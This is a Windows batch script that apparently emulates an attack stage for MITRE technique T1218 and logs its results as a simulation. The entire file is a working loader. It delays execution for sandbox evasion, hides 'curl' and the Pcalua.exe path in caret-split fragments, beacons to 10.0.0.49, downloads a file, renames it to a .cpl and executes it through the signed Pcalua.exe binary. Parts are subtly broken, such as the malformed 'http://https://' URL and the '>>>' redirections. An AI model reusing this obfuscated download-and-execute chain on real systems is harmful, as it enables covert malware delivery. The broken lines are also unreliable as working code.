@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\7943\282f8944
SET fpakbq=Macula-Stage0-7943
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?7943-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=help.txt
SET fpldhe=7943

REM Helper variables for logging and paths
SET krpsl=%APPDATA%\!yydue!
SET lfwrh=!krpsl!\macula-simulations.log
SET jhqmn=!yktnwwf!\!edjwtl!
SET dfcty=!yktnwwf!\pcafile.cpl

REM Initial sandbox evasion delay (30-60s)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Initial delay start>>> "!lfwrh!" 2>nul
SET /A qytrp=!RANDOM! %% 31 + 30
timeout /t !qytrp! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Initial delay !qytrp!s complete>>> "!lfwrh!" 2>nul

REM TTP T1218: Signed Binary Proxy Execution - Pcalua.exe DLL load
SET res_ttp=0
SET err_ttp=

REM Create target directory if missing
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Creating directory !yktnwwf!>>> "!lfwrh!" 2>nul
mkdir "!yktnwwf!" >nul 2>&1

REM STEP 1: Heartbeat check to server with obfuscated curl
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Starting heartbeat check>>> "!lfwrh!" 2>nul

SET s1=c^
SET s2=u^
SET s3=r^
SET s4=l
SET curlexe=!s1!!s2!!s3!!s4!

SET a1=-^
SET a2=k^
SET a3=-^
SET a4=s^
SET a5=-^
SET a6=o^
SET a7=nul
SET curlargs=!a1!!a2! !a3!!a4! !a5!!a6!!a7!

!curlexe! !curlargs! "!rdzgrnne!" >nul 2>&1
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Heartbeat success>>> "!lfwrh!" 2>nul
    SET hbres=1
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Heartbeat failed>>> "!lfwrh!" 2>nul
    SET hbres=0
)

ping -n 12 127.0.0.1 >nul

REM STEP 2: Download DLL from external server
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Download start from !repbmqg!>>> "!lfwrh!" 2>nul

SET d1=htt^
SET d2=p:/^
SET d3=/
SET fullurl=!d1!!d2!!d3!!repbmqg!

!curlexe! !curlargs! "!fullurl!" --output "!jhqmn!" >nul 2>&1
IF EXIST "!jhqmn!" (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Download complete>>> "!lfwrh!" 2>nul
    SET dlres=1
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Download failed>>> "!lfwrh!" 2>nul
    SET dlres=0
    SET err_ttp=download_failed
)

timeout /t 8 /nobreak >nul

REM STEP 3: Rename DLL to CPL extension
IF !dlres! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Renaming !edjwtl! to pcafile.cpl>>> "!lfwrh!" 2>nul
    ren "!jhqmn!" pcafile.cpl >nul 2>&1
    IF EXIST "!dfcty!" (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Rename successful>>> "!lfwrh!" 2>nul
        SET renres=1
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Rename failed>>> "!lfwrh!" 2>nul
        SET renres=0
        SET err_ttp=rename_failed
    )
)

CHOICE /C Y /N /D Y /T 10 >nul

REM STEP 4: Execute CPL via Pcalua.exe with heavy obfuscation
IF !renres! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Starting Pcalua execution>>> "!lfwrh!" 2>nul
    
    SET p1=C^
    SET p2=:\^
    SET p3=Wi^
    SET p4=nd^
    SET p5=ow^
    SET p6=s^
    SET p7=\^
    SET p8=S^
    SET p9=ys^
    SET p10=te^
    SET p11=m^
    SET p12=3^
    SET p13=2^
    SET p14=\^
    SET p15=P^
    SET p16=c^
    SET p17=a^
    SET p18=l^
    SET p19=u^
    SET p20=a^
    SET p21=.
    SET p22=e^
    SET p23=x^
    SET p24=e
    SET sysdir=!p1!!p2!!p3!!p4!!p5!!p6!!p7!!p8!!p9!!p10!!p11!!p12!!p13!!p14!
    SET pcalexe=!sysdir!!p15!!p16!!p17!!p18!!p19!!p20!!p21!!p22!!p23!!p24!
    
    SET arg1=-^
    SET arg2=a
    SET args=!arg1!!arg2!
    
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Executing: !pcalexe! !args! !dfcty!>>> "!lfwrh!" 2>nul
    !pcalexe! !args! "!dfcty!" >nul 2>&1
    IF !ERRORLEVEL! EQU 0 (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Pcalua execution successful>>> "!lfwrh!" 2>nul
        SET res_ttp=1
        SET err_ttp=
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Pcalua execution failed>>> "!lfwrh!" 2>nul
        SET err_ttp=execution_error_!ERRORLEVEL!
    )
)

REM Random final delay
SET /A finaldelay=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Final delay !finaldelay!s start>>> "!lfwrh!" 2>nul
timeout /t !finaldelay! /nobreak >nul

REM TTP Logging
SET ttp_id=T1218
SET ttp_name=SignedBinaryProxyExecution

REM Normalize timestamp to YYYY-MM-DD HH:MM:SS.SSS
SET logdate=!DATE:/=-!
SET logtime=!TIME:.=:!
SET logtime=!logtime: =0!

REM Build log line and append to file
IF DEFINED res_ttp (
    echo [!logdate! !logtime!][!omxgazu!]: !yydue!-!fpldhe!-!ttp_id!|!ttp_name!=!res_ttp!:!err_ttp!>> "!lfwrh!" 2>nul || echo.
)

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Simulation complete>>> "!lfwrh!" 2>nul

ENDLOCAL
exit /b 0